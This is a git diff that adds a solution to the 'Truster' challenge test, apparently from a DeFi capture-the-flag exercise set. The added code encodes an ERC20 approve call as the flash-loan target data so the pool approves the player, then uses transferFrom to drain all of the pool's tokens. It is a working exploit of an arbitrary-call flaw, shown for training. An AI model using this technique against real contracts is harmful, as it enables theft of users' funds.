@@ -23,6 +23,27 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const [user1, user2, user3] = await ethers.getSigners();
+
+        let ABI = [
+            "function approve(address spender, uint256 amount)"
+        ];
+        let iface = new ethers.utils.Interface(ABI);
+        const data = iface.encodeFunctionData('approve', [player.address, TOKENS_IN_POOL])
+        console.log('data: ', data)
+
+        await pool.flashLoan(0, player.address, token.address, data)
+        console.log('done flash loan')
+
+        const playerAllowance = await token.allowance(pool.address, player.address)
+        console.log('playerAllowance: ', playerAllowance)
+
+        const playerBalance = await token.balanceOf(player.address)
+        console.log('playerBalance: ', playerBalance)
+
+        //transfer to player
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL)
+        console.log('done transferFrom')
     });
 
     after(async function () {
